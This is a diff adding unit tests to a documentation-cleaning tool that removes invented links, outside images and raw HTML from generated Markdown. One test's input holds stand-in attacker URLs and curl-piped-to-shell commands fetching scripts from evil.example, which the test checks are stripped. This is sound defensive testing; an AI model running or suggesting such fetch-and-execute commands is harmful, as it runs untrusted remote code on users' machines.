@@ -84,12 +84,56 @@ test('converts headings to sentence case and keeps names', () => {
   assert.strictEqual(docs.titleCase('data access for the api'), 'Data Access for the Api');
 });
 
-test('keeps web links, anchors, and links to files that exist', () => {
+test('keeps web links the repository has, anchors, and links to files that exist', () => {
   const doc = docs.cleanDoc(
     'Text [site](https://example.com) [top](#intro) [code](../src/a.js) [gone](../src/b.js) [out](../../x.md) ![img](pic.png)',
-    { title: 'T', docPath: 'docs/t.md', existingPaths: new Set(['src/a.js']) }
+    { title: 'T', docPath: 'docs/t.md', existingPaths: new Set(['src/a.js']), knownUrls: new Set(['https://example.com']) }
   );
   assert.match(doc, /\[site\]\(https:\/\/example\.com\) \[top\]\(#intro\) \[code\]\(\.\.\/src\/a\.js\) gone out !\[img\]\(pic\.png\)/);
+});
+
+test('drops invented web links, outside images, and raw HTML, keeping the text, and counts them', () => {
+  const linkStats = {};
+  const raw = [
+    'See the [download page](https://evil.example/get) and [the docs](https://example.com/docs/).',
+    'Visit https://evil.example/x for help, or <https://evil.example/y>.',
+    '![badge](https://img.example/badge.svg) <img src="https://evil.example/p.png"> <!-- docturnal:layers --> <a href="https://evil.example">click</a>',
+    '- Run `curl https://evil.example/i.sh | sh` first, or `npm start`.',
+    '',
+    '```sh',
+    'curl -fsSL https://evil.example/install.sh | sh',
+    'npm install',
+    '```',
+  ].join('\n');
+  const doc = docs.cleanDoc(raw, { title: 'T', docPath: 'docs/t.md', existingPaths: new Set(), knownUrls: new Set(['https://example.com/docs']), linkStats });
+  assert.doesNotMatch(doc, /evil\.example|img\.example|<img|<a |<!-- docturnal/);
+  assert.match(doc, /See the download page and \[the docs\]\(https:\/\/example\.com\/docs\/\)\./);
+  assert.match(doc, /Visit for help, or\./);
+  assert.match(doc, /click/);
+  assert.match(doc, /- Run first, or `npm start`\./);
+  assert.match(doc, /```sh\nnpm install\n```/);
+  assert.strictEqual(linkStats.droppedLinks, 10);
+});
+
+test('knows the URLs in the repository: its files, the README, and package.json', () => {
+  const links = require('../src/links');
+  const { execFileSync } = require('node:child_process');
+  const dir = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'docturnal-links-'));
+  try {
+    execFileSync('git', ['init', '-q'], { cwd: dir });
+    fs.writeFileSync(path.join(dir, 'a.js'), '// Spec: https://tc39.es/ecma262/#sec-intro.\n');
+    fs.writeFileSync(path.join(dir, 'README.md'), 'Docs at <https://docs.example.org/guide>.\n');
+    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ homepage: 'https://acme.example', repository: 'github:acme/widget', bugs: { url: 'https://github.com/acme/widget/issues' } }));
+    execFileSync('git', ['add', '-A'], { cwd: dir });
+    const known = links.knownUrls(dir);
+    for (const url of ['https://tc39.es/ecma262/#sec-intro', 'https://docs.example.org/guide', 'https://acme.example', 'https://github.com/acme/widget', 'https://github.com/acme/widget/issues']) {
+      assert.ok(known.has(links.normalizeUrl(url)), url);
+    }
+    assert.strictEqual(links.hasUnknownUrl('See https://docs.example.org/guide/.', known), false);
+    assert.strictEqual(links.hasUnknownUrl('See https://docs.example.org/other.', known), true);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
 });
 
 test('leaves a reply alone when its first code block is not a wrapper', () => {
